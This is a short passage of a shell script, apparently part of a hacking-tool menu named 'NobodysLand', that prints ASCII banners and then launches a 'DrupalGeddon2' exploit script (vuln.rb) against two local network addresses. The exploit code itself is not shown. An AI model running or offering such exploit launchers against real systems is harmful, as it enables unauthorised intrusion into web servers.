...
figlet -f cosmic "Nobody" |lolcat
figlet  -f rev "LAND" |lolcat
...
figlet "DG2"
cd /$HOME/NobodysLand/
echo -e $yel"[×] DrupalGeddon2"
echo -e $yel"Starting..."
ruby vuln.rb http://192.168.1.1
ruby vuln.rb http://192.168.0.1
fi
